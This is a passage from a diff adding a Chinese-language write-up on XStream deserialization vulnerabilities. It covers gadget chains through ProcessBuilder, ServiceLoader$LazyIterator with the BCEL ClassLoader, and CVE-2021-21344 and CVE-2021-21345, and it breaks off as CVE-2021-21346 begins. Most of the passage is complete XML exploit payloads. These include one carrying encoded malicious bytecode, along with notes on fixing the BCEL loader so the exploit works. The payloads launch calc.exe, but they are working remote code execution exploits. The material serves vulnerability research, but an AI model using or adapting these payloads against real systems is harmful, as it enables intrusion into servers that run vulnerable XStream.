+      &lt;flags&gt;0&lt;/flags&gt;
+      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+        &lt;dataHandler&gt;
+          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+                &lt;initialized&gt;false&lt;/initialized&gt;
+                &lt;opmode&gt;0&lt;/opmode&gt;
+                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                      &lt;command class=&quot;java.util.Arrays$ArrayList&quot;&gt;
+                        &lt;a class=&quot;string-array&quot;&gt;
+                          &lt;string&gt;calc.exe&lt;/string&gt;
+                        &lt;/a&gt;
+                      &lt;/command&gt;
+                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+                    &lt;/next&gt;
+                  &lt;/iter&gt;
+                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+                    &lt;method&gt;
+                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                      &lt;name&gt;start&lt;/name&gt;
+                      &lt;parameter-types/&gt;
+                    &lt;/method&gt;
+                    &lt;name&gt;foo&lt;/name&gt;
+                  &lt;/filter&gt;
+                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+                &lt;/serviceIterator&gt;
+                &lt;lock/&gt;
+              &lt;/cipher&gt;
+              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+              &lt;ibuffer&gt;&lt;/ibuffer&gt;
+              &lt;done&gt;false&lt;/done&gt;
+              &lt;ostart&gt;0&lt;/ostart&gt;
+              &lt;ofinish&gt;0&lt;/ofinish&gt;
+              &lt;closed&gt;false&lt;/closed&gt;
+            &lt;/is&gt;
+            &lt;consumed&gt;false&lt;/consumed&gt;
+          &lt;/dataSource&gt;
+          &lt;transferFlavors/&gt;
+        &lt;/dataHandler&gt;
+        &lt;dataLen&gt;0&lt;/dataLen&gt;
+      &lt;/value&gt;
+    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString /&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString /&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString /&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><h3 id="serviceloaderlazyiterator">ServiceLoader$LazyIterator</h3>
+<p>&#x5728;<code>java.util.ServiceLoader$LazyIterator</code>&#x7C7B;&#x7684;next&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;<code>Class.forName</code>, &#x5176;&#x4E2D;ClassName&#x548C;loader&#x90FD;&#x53EF;&#x63A7;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4EE5;&#x524D;BCEL&#x7684;classLoader&#x4F1A;&#x628A;className&#x5185;&#x5BB9;&#x5F53;&#x5B57;&#x8282;&#x7801;&#x52A0;&#x8F7D;&#x7684;gadget&#x5B9E;&#x73B0;getshell&#x3002; </p>
+<p><img src="img/image-20210707162814248.png" alt="image-20210707162814248"> </p>
+<p>&#x867D;&#x7136;<code>Class.forName</code>&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;false&#x65E0;&#x6CD5;&#x52A0;&#x8F7D;&#x7C7B;&#x7684;&#x9759;&#x6001;&#x5757;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x540E;&#x7EED;&#x5B9E;&#x4F8B;&#x5316;&#x4E86;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5728;&#x65E0;&#x53C2;&#x6784;&#x9020;&#x51FD;&#x6570;&#x91CC;&#x63D2;&#x5165;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x3002; </p>
+<h3 id="&#x4FEE;&#x6539;bcel-classloader&#x6784;&#x9020;poc">&#x4FEE;&#x6539;BCEL ClassLoader&#x6784;&#x9020;POC</h3>
+<p>&#x8FD9;&#x91CC;&#x6765;&#x63D0;&#x4E00;&#x4E0B;&#x5173;&#x4E8E;POC&#x7684;&#x6784;&#x9020;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x4F7F;&#x7528;&#x4E86;&#x5F53;&#x524D;&#x8FD9;&#x4E2A;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x5BF9;<code>ClassLoader</code>&#x505A;&#x5904;&#x7406;&#x7684;&#x8BDD;&#xFF0C;&#x4F60;&#x4F1A;&#x53D1;&#x73B0;&#x600E;&#x4E48;&#x90FD;&#x6253;&#x4E0D;&#x901A;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x5728;&#x5B9E;&#x9645;&#x8FD8;&#x539F;<code>ClassLoader</code>&#x7684;&#x65F6;&#x5019;&#x51FA;&#x73B0;&#x4E86;&#x9519;&#x8BEF;</p>
+<p><img src="img/image-20200417225056222.png" alt="image-20200417225056222"></p>
+<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x79CD;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4E00;&#x662F;&#x53BB;&#x9664;&#x8FD9;&#x79CD;&#x8FD8;&#x539F;&#x6709;&#x95EE;&#x9898;&#x7684;&#x7C7B;&#xFF08;&#x4F1A;&#x5F88;&#x9EBB;&#x70E6;&#xFF09;&#xFF0C;&#x4E8C;&#x662F;&#x76F4;&#x63A5;&#x628A;<code>ClassLoader</code>&#x91CC;&#x7684;&#x4E00;&#x4E9B;&#x65E0;&#x5173;&#x7D27;&#x8981;&#x7684;&#x4E1C;&#x897F;&#x5254;&#x9664;&#x6389;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x6211;&#x9009;&#x62E9;&#x4E86;&#x7B2C;&#x4E8C;&#x79CD;&#xFF0C;&#x7ECF;&#x8FC7;&#x8C03;&#x8BD5;&#x53BB;&#x9664;&#x4E86;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5C5E;&#x6027;&#x7684;&#x503C;</p>
+<p><img src="img/image-20200417225303428.png" alt="image-20200417225303428"></p>
+<p>&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x5254;&#x9664;&#x4E86;<code>ignored_packages</code>&#x548C;<code>deferTo</code>&#xFF0C;&#x5BFC;&#x81F4;BCEL&#x7684;ClassLoader&#x5728;&#x8F7D;&#x5165;&#x666E;&#x901A;&#x7684;&#x7C7B;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x51FA;&#x73B0;&#x52A0;&#x8F7D;&#x9519;&#x8BEF;&#x7684;&#x95EE;&#x9898;</p>
+<p><img src="img/image-20200417225600161.png" alt="image-20200417225600161"></p>
+<p>&#x6765;&#x770B;&#x770B;&#x600E;&#x4E48;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;</p>
+<p>&#x9996;&#x5148;BCEL&#x7684;<code>ClassLoader.loadClass</code>&#xFF0C;&#x4E00;&#x5171;&#x5C1D;&#x8BD5;4&#x6B21;&#x4E0D;&#x540C;&#x7684;&#x8F7D;&#x5165;&#x65B9;&#x6CD5;</p>
+<ol>
+<li><p>&#x4ECE;&#x5F53;&#x524D;ClassLoader&#x7684;classes&#x53BB;&#x627E;</p>
+<p><img src="img/image-20200417225808446.png" alt="image-20200417225808446"></p>
+</li>
+<li><p>&#x5BF9;&#x4E8E;&#x9ED8;&#x8BA4;&#x5FFD;&#x7565;&#x7684;&#x5305;<code>java./sun./javax.</code>&#xFF0C;&#x4F7F;&#x7528;<code>deferTo</code>&#x53BB;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>deferTo</code>&#x662F;&#x7CFB;&#x7EDF;&#x7684;ClassLoader&#xFF08;<code>ClassLoader.getSystemClassLoader()</code>)</p>
+<p><img src="img/image-20200417230040882.png" alt="image-20200417230040882"></p>
+</li>
+<li><p>&#x5BF9;&#x4E8E;classname&#x4EE5;<code>$$BCEL$$</code>&#x5F00;&#x5934;&#x7684;&#xFF0C;&#x6839;&#x636E;classname&#x7684;&#x503C;&#x53BB;defineClass&#xFF0C;&#x8FD9;&#x8FB9;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6700;&#x559C;&#x6B22;&#x7684;&#x4EFB;&#x610F;&#x8F7D;&#x5165;&#x5B57;&#x8282;&#x7801;&#x7684;&#x5730;&#x65B9;</p>
+<p><img src="img/image-20200417230343866.png" alt="image-20200417230343866"></p>
+</li>
+<li><p>&#x6700;&#x540E;&#x4E00;&#x6B21;&#x662F;&#x7528;<code>repository</code>&#x53BB;&#x8F7D;&#x5165;&#x5F53;&#x524D;&#x7684;classname&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x91CC;&#x8FD8;&#x6CA1;&#x627E;&#x5230;&#xFF0C;&#x5C31;&#x4F1A;&#x7206;&#x6CA1;&#x6709;&#x627E;&#x5230;Class&#x7684;&#x9519;&#x8BEF;</p>
+<p><img src="img/image-20200417230451954.png" alt="image-20200417230451954"></p>
+<p>PS&#xFF1A;&#x8FD9;&#x90E8;&#x5206;<code>repository</code>&#x53D6;&#x7684;<code>SyntheticRepository.getInstance()</code>&#xFF0C;&#x8FD8;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#x8FD9;&#x4E2A;&#x5DE6;&#x53F3;&#xFF0C;&#x540E;&#x7EED;&#x6574;&#x7406;&#x4E00;&#x4E0B;ClassLoader&#x76F8;&#x5173;&#x7684;&#x77E5;&#x8BC6;&#x518D;&#x505A;&#x8865;&#x5145;</p>
+</li>
+</ol>
+<p>&#x518D;&#x6765;&#x770B;&#x6211;&#x4EEC;&#x62A5;&#x9519;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x56E0;&#x4E3A;&#x5220;&#x9664;<code>ignored_packages</code>&#x548C;<code>deferTo</code>&#x4E4B;&#x540E;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x7B2C;&#x4E8C;&#x79CD;&#x60C5;&#x51B5;&#x65E0;&#x6CD5;&#x8F7D;&#x5165;&#x4E86;&#xFF0C;&#x800C;&#x663E;&#x7136;<code>java.lang.Object</code>&#x4E0D;&#x7B26;&#x5408;&#x7B2C;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#x3002;&#x6700;&#x540E;&#x7B2C;4&#x79CD;&#x91CC;&#x9762;&#x4E5F;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x8FD9;&#x4E2A;<code>java.lang.Object</code>&#xFF0C;&#x6240;&#x4EE5;&#x6700;&#x7EC8;&#x7206;&#x4E86;<code>ClassNotFoundException</code></p>
+<p>&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x5DF2;&#x7ECF;&#x5F88;&#x660E;&#x663E;&#x4E86;&#xFF0C;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5728;<code>classes</code>&#x91CC;&#x6DFB;&#x52A0;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;class&#x5B57;&#x8282;&#x7801;&#x91CC;&#x6240;&#x7528;&#x5230;&#x7684;&#x6240;&#x6709;&#x7C7B;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5C1D;&#x8BD5;&#x8F7D;&#x5165;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x627E;&#x5230;&#x4E86;&#x76F8;&#x5E94;&#x7684;&#x7C7B;&#xFF0C;&#x65E0;&#x9700;&#x5C1D;&#x8BD5;&#x540E;&#x7EED;&#x7684;&#x51E0;&#x79CD;&#x8F7D;&#x5165;&#x65B9;&#x5F0F;&#x3002;</p>
+<p>&#x6BD4;&#x5982;&#x8FD9;&#x91CC;&#x6211;&#x4EA7;&#x751F;&#x7684;&#x5B57;&#x8282;&#x7801;&#x91CC;&#x9762;&#x7528;&#x4E0A;&#x4E86;<code>Runtime</code>&#xFF0C;&#x5C31;&#x5F97;&#x52A0;&#x4E0A;&#x8FD9;&#x4E2A;&#x7C7B;</p>
+<p><img src="img/image-20200417231357924.png" alt="image-20200417231357924"></p>
+<p>&#x8FD9;&#x91CC;&#x7684;Object&#x5FC5;&#x987B;&#x52A0;&#x4E0A;&#xFF0C;&#x6BD5;&#x7ADF;&#x6240;&#x6709;&#x7684;&#x5BF9;&#x8C61;&#x90FD;&#x7EE7;&#x627F;&#x81EA;Object</p>
+<p>&#x6D4B;&#x8BD5;&#x540E;&#x53D1;&#x73B0;&#x62A5;&#x9519;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x7684;&#x7C7B;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x6DFB;&#x52A0;, &#x57FA;&#x672C;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x9700;&#x8981;&#x4EE5;&#x4E0B;&#x56DB;&#x4E2A;&#x7C7B;</p>
+<pre><code>java.lang.Object
+java.lang.Runtime
+java.lang.Throwable
+java.lang.Exception
+</code></pre><p>POC</p>
+<pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString&gt;
+      &lt;flags&gt;0&lt;/flags&gt;
+      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+        &lt;dataHandler&gt;
+          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+                &lt;initialized&gt;false&lt;/initialized&gt;
+                &lt;opmode&gt;0&lt;/opmode&gt;
+                &lt;serviceIterator class=&quot;java.util.ServiceLoader$LazyIterator&quot;&gt;
+                  &lt;service&gt;java.lang.Object&lt;/service&gt;
+                  &lt;loader class=&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&gt;
+                    &lt;package2certs class=&quot;hashtable&quot;/&gt;
+                    &lt;classes defined-in=&quot;java.lang.ClassLoader&quot;/&gt;
+                    &lt;defaultDomain&gt;
+                      &lt;principals/&gt;
+                      &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;
+                      &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;
+                      &lt;key/&gt;
+                    &lt;/defaultDomain&gt;
+                    &lt;domains/&gt;
+                    &lt;packages/&gt;
+                    &lt;nativeLibraries/&gt;
+                    &lt;defaultAssertionStatus&gt;false&lt;/defaultAssertionStatus&gt;
+                    &lt;classes&gt;
+                      &lt;entry&gt;
+                        &lt;string&gt;java.lang.Object&lt;/string&gt;
+                        &lt;java-class&gt;java.lang.Object&lt;/java-class&gt;
+                      &lt;/entry&gt;
+                      &lt;entry&gt;
+                        &lt;string&gt;java.lang.Runtime&lt;/string&gt;
+                        &lt;java-class&gt;java.lang.Runtime&lt;/java-class&gt;
+                      &lt;/entry&gt;
+                      &lt;entry&gt;
+                        &lt;string&gt;java.lang.Throwable&lt;/string&gt;
+                        &lt;java-class&gt;java.lang.Throwable&lt;/java-class&gt;
+                      &lt;/entry&gt;
+                      &lt;entry&gt;
+                        &lt;string&gt;java.lang.Exception&lt;/string&gt;
+                        &lt;java-class&gt;java.lang.Exception&lt;/java-class&gt;
+                      &lt;/entry&gt;
+                    &lt;/classes&gt;
+                    &lt;ignored__packages/&gt;
+                    &lt;repository class=&quot;com.sun.org.apache.bcel.internal.util.SyntheticRepository&quot;&gt;
+                      &lt;__path&gt;
+                        &lt;paths/&gt;
+                        &lt;class__path&gt;&lt;/class__path&gt;
+                      &lt;/__path&gt;
+                      &lt;__loadedClasses/&gt;
+                    &lt;/repository&gt;
+                  &lt;/loader&gt;
+                  &lt;nextName&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2P$Q$3d$X$K$z$b5$3cD$f1$fd$7e$C$LY$b8$d4$b8$d0$e0$c6$fa$88$Y$5c_$ae7x$b5$b6$a4$5c$88$7f$e4$da$8d$g$X$7e$80$le$9c$d6$H$gm$d2$99$ce$993g$ce$a4$afo$cf$_$A6$b1f$c3$c2$b8$8d$JLZ$98$8a$f2$b4$89$Z$h$v$cc$9a$9831$cf$90$deV$be$d2$3b$M$c9r$a5$c9$60$ec$F$X$92$n$ef$w_$k$f5nZ2$3c$e3$z$8f$90$a2$h$I$ee5y$a8$a2$fa$T4$f4$a5$ea2$U$dc$9eV$5e$b7V$ef$xow$af$een1X$db$c2$fb$UfD$y$b9W$bc$cfk$k$f7$db$b5$fa$ad$90$j$ad$C$9fh$d9$86$e6$e2$fa$90wbA$f2$c6$607$82$5e$u$e4$be$8a$Wd$bf$q7$a2y$H$Z$d8$s$W$i$yb$89v$90$n$b1$no$a5$83e$ac0$8c$fc$b3$c3$c1$wl$86$dco$83dy$c0$3dn$5dI$a1$Z$86$H$d0i$cf$d7$ea$86$f6$dbm$a9$bf$8bR$b9$e2$fe$e1$d0$R$GY$Q$M$eb$e5$l$dd$86$O$95$df$de$fa9p$S$GBv$bb4$90$efPS$c7$a7$9f$85$5cH$3a$c7$a4$l$V$3d$J$b0$e8H$8aCT$d5$u3$ca$a9$ea$p$d8$7d$dcv$u$a6c0$89$yE$e7$83$80$i$f2$94$z$U$be$87y$y$G$U$9f$90$u$s$l$60$9c$df$c1$3a$a8$3e$m$7d$l$e3$Z$9aM$91J$a48F_$91n$sFMR$b60LJ_$h$b20$a8$$R5B$af$89$84kb$d4$a0F$v65$f6$O$ff8$d8$efr$C$A$A&lt;/nextName&gt;
+                  &lt;outer-class/&gt;
+                &lt;/serviceIterator&gt;
+                &lt;lock/&gt;
+              &lt;/cipher&gt;
+              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+              &lt;ibuffer&gt;&lt;/ibuffer&gt;
+              &lt;done&gt;false&lt;/done&gt;
+              &lt;ostart&gt;0&lt;/ostart&gt;
+              &lt;ofinish&gt;0&lt;/ofinish&gt;
+              &lt;closed&gt;false&lt;/closed&gt;
+            &lt;/is&gt;
+            &lt;consumed&gt;false&lt;/consumed&gt;
+          &lt;/dataSource&gt;
+          &lt;transferFlavors/&gt;
+        &lt;/dataHandler&gt;
+        &lt;dataLen&gt;0&lt;/dataLen&gt;
+      &lt;/value&gt;
+    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><h3 id="cve-2021-21344">CVE-2021-21344</h3>
+<p>&#x4ECE;PriorityQueue&#x7684;readObject&#x8C03;&#x7528;compare&#x4F5C;&#x4E3A;&#x5165;&#x53E3;&#x70B9;&#xFF0C;&#x76F4;&#x5230;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor.GetterSetterReflection&#x7684;get&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x4E86;&#x53CD;&#x5C04;&#x8C03;&#x7528;&#x3002;&#x5173;&#x952E;&#x70B9;&#x5728;&#x4E8E;Accessor.GetterSetterReflection&#x7C7B;&#x867D;&#x7136;&#x672A;&#x5B9E;&#x73B0;Serializable&#x63A5;&#x53E3;&#xFF0C;&#x4F46;&#x662F;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4F7F;&#x7528;&#x3002;&#x4E0B;&#x56FE;&#x5C31;&#x662F;&#x6700;&#x540E;&#x5229;&#x7528;ProcessBuilder.start&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x94FE;</p>
+<p><img src="img/image-20210708172404217-1644257101300.png" alt="image-20210708172404217">  </p>
+<p>POC1</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+      &lt;comparator class=&apos;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&apos;&gt;
+        &lt;indexMap class=&apos;com.sun.xml.internal.ws.client.ResponseContext&apos;&gt;
+          &lt;packet&gt;
+            &lt;message class=&apos;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&apos;&gt;
+              &lt;dataSource class=&apos;com.sun.xml.internal.ws.message.JAXBAttachment&apos;&gt;
+                &lt;bridge class=&apos;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&apos;&gt;
+                  &lt;bridge class=&apos;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&apos;&gt;
+                    &lt;bi class=&apos;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&apos;&gt;
+                      &lt;jaxbType&gt;java.lang.ProcessBuilder&lt;/jaxbType&gt;
+                      &lt;uriProperties/&gt;
+                      &lt;attributeProperties/&gt;
+                      &lt;inheritedAttWildcard class=&apos;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&apos;&gt;
+                        &lt;getter&gt;
+                          &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                          &lt;name&gt;start&lt;/name&gt;
+                          &lt;parameter-types/&gt;
+                        &lt;/getter&gt;
+                      &lt;/inheritedAttWildcard&gt;
+                    &lt;/bi&gt;
+                    &lt;tagName/&gt;
+                    &lt;context&gt;
+                      &lt;marshallerPool class=&apos;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&apos;&gt;
+                        &lt;outer-class reference=&apos;../..&apos;/&gt;
+                      &lt;/marshallerPool&gt;
+                      &lt;nameList&gt;
+                        &lt;nsUriCannotBeDefaulted&gt;
+                          &lt;boolean&gt;true&lt;/boolean&gt;
+                        &lt;/nsUriCannotBeDefaulted&gt;
+                        &lt;namespaceURIs&gt;
+                          &lt;string&gt;1&lt;/string&gt;
+                        &lt;/namespaceURIs&gt;
+                        &lt;localNames&gt;
+                          &lt;string&gt;UTF-8&lt;/string&gt;
+                        &lt;/localNames&gt;
+                      &lt;/nameList&gt;
+                    &lt;/context&gt;
+                  &lt;/bridge&gt;
+                &lt;/bridge&gt;
+                &lt;jaxbObject class=&apos;java.lang.ProcessBuilder&apos;&gt;
+                  &lt;command&gt;
+                    &lt;string&gt;calc.exe&lt;/string&gt;
+                  &lt;/command&gt;
+                &lt;/jaxbObject&gt;
+              &lt;/dataSource&gt;
+            &lt;/message&gt;
+            &lt;satellites/&gt;
+            &lt;invocationProperties/&gt;
+          &lt;/packet&gt;
+        &lt;/indexMap&gt;
+      &lt;/comparator&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;
+    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><h3 id="cve-2021-21345">CVE-2021-21345</h3>
+<p>&#x5728;CVE-2021-21344&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x4E0D;&#x91C7;&#x7528;JdbcRowSetImpl&#x800C;&#x662F;&#x4F7F;&#x7528;<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>&#x7C7B;&#x76F4;&#x63A5;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;, &#x5728; ServerTableEntry &#x7C7B;&#x7684; verify &#x65B9;&#x6CD5;&#x4E0A;</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">verify</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">try</span> {
+
+            <span class="hljs-keyword">if</span> (debug)
+                System.out.println(<span class="hljs-string">&quot;Server being verified w/&quot;</span> + activationCmd);
+
+            process = Runtime.getRuntime().exec(activationCmd);
+            <span class="hljs-keyword">int</span> result = process.waitFor();
+            <span class="hljs-keyword">if</span> (debug)
+                printDebug( <span class="hljs-string">&quot;verify&quot;</span>, <span class="hljs-string">&quot;returns &quot;</span> + ServerMain.printResult( result ) ) ;
+            <span class="hljs-keyword">return</span> result ;
+        } <span class="hljs-keyword">catch</span> (Exception e) {
+            <span class="hljs-keyword">if</span> (debug)
+                printDebug( <span class="hljs-string">&quot;verify&quot;</span>, <span class="hljs-string">&quot;returns unknown error because of exception &quot;</span> +
+                            e ) ;
+            <span class="hljs-keyword">return</span> ServerMain.UNKNOWN_ERROR;
+        }
+    }
+</code></pre>
+<p>&#x63A7;&#x5236; activationCmd &#x7684;&#x503C;&#x5373;&#x53EF;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+      &lt;comparator class=&apos;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&apos;&gt;
+        &lt;indexMap class=&apos;com.sun.xml.internal.ws.client.ResponseContext&apos;&gt;
+          &lt;packet&gt;
+            &lt;message class=&apos;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&apos;&gt;
+              &lt;dataSource class=&apos;com.sun.xml.internal.ws.message.JAXBAttachment&apos;&gt;
+                &lt;bridge class=&apos;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&apos;&gt;
+                  &lt;bridge class=&apos;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&apos;&gt;
+                    &lt;bi class=&apos;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&apos;&gt;
+                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;
+                      &lt;uriProperties/&gt;
+                      &lt;attributeProperties/&gt;
+                      &lt;inheritedAttWildcard class=&apos;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&apos;&gt;
+                        &lt;getter&gt;
+                          &lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt;
+                          &lt;name&gt;verify&lt;/name&gt;
+                          &lt;parameter-types/&gt;
+                        &lt;/getter&gt;
+                      &lt;/inheritedAttWildcard&gt;
+                    &lt;/bi&gt;
+                    &lt;tagName/&gt;
+                    &lt;context&gt;
+                      &lt;marshallerPool class=&apos;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&apos;&gt;
+                        &lt;outer-class reference=&apos;../..&apos;/&gt;
+                      &lt;/marshallerPool&gt;
+                      &lt;nameList&gt;
+                        &lt;nsUriCannotBeDefaulted&gt;
+                          &lt;boolean&gt;true&lt;/boolean&gt;
+                        &lt;/nsUriCannotBeDefaulted&gt;
+                        &lt;namespaceURIs&gt;
+                          &lt;string&gt;1&lt;/string&gt;
+                        &lt;/namespaceURIs&gt;
+                        &lt;localNames&gt;
+                          &lt;string&gt;UTF-8&lt;/string&gt;
+                        &lt;/localNames&gt;
+                      &lt;/nameList&gt;
+                    &lt;/context&gt;
+                  &lt;/bridge&gt;
+                &lt;/bridge&gt;
+                &lt;jaxbObject class=&apos;com.sun.corba.se.impl.activation.ServerTableEntry&apos;&gt;
+                  &lt;activationCmd&gt;calc.exe&lt;/activationCmd&gt;
+                &lt;/jaxbObject&gt;
+              &lt;/dataSource&gt;
+            &lt;/message&gt;
+            &lt;satellites/&gt;
+            &lt;invocationProperties/&gt;
+          &lt;/packet&gt;
+        &lt;/indexMap&gt;
+      &lt;/comparator&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;
+    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><h3 id="cve-2021-21346">CVE-2021-21346</h3>
+<p>&#x901A;&#x8FC7;TreeMap&#x7684;put&#x65B9;&#x6CD5;&#x8C03;&#x7528;Rdn$RdnEntry&#x7684;compareTo&#x65B9;&#x6CD5;</p>
+<p>&#x518D;&#x901A;&#x8FC7;<code>value.equals</code> &#x89E6;&#x53D1; XString &#x7684; equals &#x65B9;&#x6CD5;, <code>that.value</code> &#x8D4B;&#x503C;&#x4E3A; MultiUIDefaults &#x5B9E;&#x4F8B;, &#x89E6;&#x53D1;&#x5176; <code>toString</code> &#x65B9;&#x6CD5;</p>
